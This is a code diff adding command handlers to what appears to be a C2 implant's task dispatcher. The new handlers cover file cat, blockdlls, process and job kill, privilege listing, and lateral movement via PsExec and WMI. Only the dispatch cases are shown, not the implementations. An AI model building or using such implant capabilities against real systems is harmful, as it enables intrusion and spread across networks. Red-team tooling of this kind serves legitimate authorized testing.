@@ -16,6 +16,8 @@
 #include "Tasks/Token.h"
 #include "Tasks/Link.h"
 #include "Tasks/Exit.h"
+#include "Tasks/LateralMovement.h"
+#include "Tasks/JobKill.h"
 
 /**
  * @brief Process commands from GET_TASKING
@@ -104,6 +106,14 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
             return;
         }
 #endif
+#ifdef INCLUDE_CMD_CAT
+        case CAT_CMD:
+        {
+            _dbg("CAT_CMD was called");
+            FileSystemCat(taskUuid, taskParser);
+            return;
+        }
+#endif
 #ifdef INCLUDE_CMD_DOWNLOAD
         case DOWNLOAD_CMD:
         {
@@ -156,6 +166,46 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
             return;
         }
 #endif
+#ifdef INCLUDE_CMD_BLOCKDLLS
+        case BLOCKDLLS_CMD:
+        {
+            _dbg("BLOCKDLLS_CMD was called");
+            ProcessBlockDlls(taskUuid, taskParser);
+            return;
+        }
+#endif
+#ifdef INCLUDE_CMD_KILL
+        case KILL_CMD:
+        {
+            _dbg("KILL_CMD was called");
+            ProcessKill(taskUuid, taskParser);
+            return;
+        }
+#endif
+#ifdef INCLUDE_CMD_JUMP_PSEXEC
+        case JUMP_PSEXEC_CMD:
+        {
+            _dbg("JUMP_PSEXEC_CMD was called");
+            LateralMovementPsexec(taskUuid, taskParser);
+            return;
+        }
+#endif
+#ifdef INCLUDE_CMD_JUMP_WMI
+        case JUMP_WMI_CMD:
+        {
+            _dbg("JUMP_WMI_CMD was called");
+            LateralMovementWmi(taskUuid, taskParser);
+            return;
+        }
+#endif
+#ifdef INCLUDE_CMD_JOB_KILL
+        case JOB_KILL_CMD:
+        {
+            _dbg("JOB_KILL_CMD was called");
+            JobKill(taskUuid, taskParser);
+            return;
+        }
+#endif
 #ifdef INCLUDE_CMD_GETUID
         case GETUID_CMD:
         {
@@ -185,6 +235,14 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("REV2SELF_CMD was called");
             TokenRevert(taskUuid, taskParser);
+            return;
+        }
+#endif
+#ifdef INCLUDE_CMD_GETPRIVS
+        case GETPRIVS_CMD:
+        {
+            _dbg("GETPRIVS_CMD was called");
+            TokenGetPrivs(taskUuid, taskParser);
             return;
         }
 #endif
